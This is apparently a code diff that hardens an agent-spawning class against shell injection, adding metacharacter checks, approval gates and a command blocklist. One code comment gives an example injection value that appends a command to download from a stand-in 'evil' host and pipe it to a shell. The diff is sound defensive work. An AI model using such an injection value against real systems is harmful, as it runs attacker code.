@@ -9,9 +9,23 @@ from typing import Any
 
 from app.config.agent_backends import get_backend
 from app.services.computer_use.executor import execute
-from app.services.computer_use.safety import check_rate_limit, log_action
+from app.services.computer_use.safety import (
+    check_approval_required,
+    check_command_blocklist,
+    check_rate_limit,
+    log_action,
+)
 
 logger = logging.getLogger(__name__)
+
+# Shell metacharacters that would break out of the interpolated `cd … && …` line.
+_SHELL_META = re.compile(r"[;&|`$<>(){}\n\r]")
+
+
+def _reject_shell_meta(value: str, label: str) -> None:
+    """Reject caller-supplied values that could inject shell commands."""
+    if value and _SHELL_META.search(value):
+        raise ValueError(f"Unsafe shell metacharacters in {label}")
 
 
 class AgentRunner:
@@ -26,9 +40,16 @@ class AgentRunner:
     ) -> dict[str, Any]:
         """Spawn a coding agent in a new tmux session."""
         check_rate_limit()
+        check_approval_required(f"spawn {backend_name}")
         backend = get_backend(backend_name)
         if not backend:
             raise ValueError(f"Unknown agent backend: {backend_name}")
+
+        # These are interpolated into a shell line below — block injection at the
+        # source (e.g. working_directory='/tmp && curl evil | sh #').
+        _reject_shell_meta(working_directory, "working_directory")
+        for k, v in (env_vars or {}).items():
+            _reject_shell_meta(str(v), f"env var '{k}'")
 
         # Create tmux session
         create_args = ["session", "create", session_name]
@@ -46,6 +67,9 @@ class AgentRunner:
             merged = {**backend.env_vars, **(env_vars or {})}
             env_prefix = " ".join(f"{k}={v}" for k, v in merged.items())
             cd_cmd = f"{env_prefix} {cd_cmd}"
+
+        # Defense in depth: also run the assembled line through the blocklist.
+        check_command_blocklist(cd_cmd)
 
         # Send command to tmux session
         send_args = ["send", cd_cmd, "--session", session_name]
@@ -77,6 +101,7 @@ class AgentRunner:
     ) -> dict[str, Any]:
         """Send a task prompt to a running agent."""
         check_rate_limit()
+        check_approval_required("agent prompt")
         backend = get_backend(backend_name) if backend_name else None
 
         if backend and backend.prompt_method == "stdin":
@@ -106,9 +131,14 @@ class AgentRunner:
         self,
         session_name: str,
         lines: int = 100,
+        *,
+        count_toward_rate_limit: bool = True,
     ) -> dict[str, Any]:
         """Capture current output from a running agent's tmux pane."""
-        check_rate_limit()
+        # Internal completion-polling passes count_toward_rate_limit=False so a
+        # long wait_for_completion isn't throttled/aborted by the action limit.
+        if count_toward_rate_limit:
+            check_rate_limit()
         args = ["logs", "--session", session_name, "--lines", str(lines)]
         result = await execute("drive", args)
         output = str(result.get("output", ""))
@@ -136,7 +166,7 @@ class AgentRunner:
         last_output = ""
 
         while elapsed < timeout:
-            result = await self.monitor(session_name)
+            result = await self.monitor(session_name, count_toward_rate_limit=False)
             current_output = result["output"]
 
             # Check if output matches completion pattern
@@ -216,14 +246,14 @@ class AgentRunner:
             await execute("drive", send_args)
             await asyncio.sleep(1)
         except Exception:
-            pass
+            logger.debug("Graceful Ctrl-C failed for %s", session_name, exc_info=True)
 
         # Kill the tmux session
         try:
             kill_args = ["session", "kill", session_name]
             await execute("drive", kill_args)
         except Exception:
-            pass
+            logger.debug("Session kill failed for %s", session_name, exc_info=True)
 
         log_action(
             node_type="agent_stop",
